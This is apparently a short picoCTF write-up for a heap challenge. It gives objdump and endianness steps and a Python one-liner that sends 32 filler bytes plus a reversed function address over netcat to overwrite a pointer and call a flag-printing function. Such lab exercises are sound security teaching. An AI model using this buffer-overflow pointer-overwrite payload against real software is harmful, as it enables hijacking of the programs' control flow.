# Solution
- Analyze the given source code -> the flag is read and displayed by the function `win` and we need to manipulate the pointer to call this function
- First we need address of the win function
	- `objdump -D ./heap2 | grep win` -> assume address is 004011a0 
	- Check the endianness of the executable using exiftool -> little endian
	- Hence the address will have to be flipped before sending it to the executable -> 00 40 11 a0 becomes a0 11 40 00
	- Since byte value can't be sent directly using nc we can write the output as bytes into a file and read that file into the netcat connection
		- `python3 -c 'import sys; sys.stdout.buffer.write(b"2\n" + b"A"*32 + b"\xa0\x11\x40\x00"+b"\n1\n3\n4\n5")' > input`
		- `nc <ip> <port> < input`
- Flag -> `picoCTF{and_down_the_road_we_go_<some_id>}`
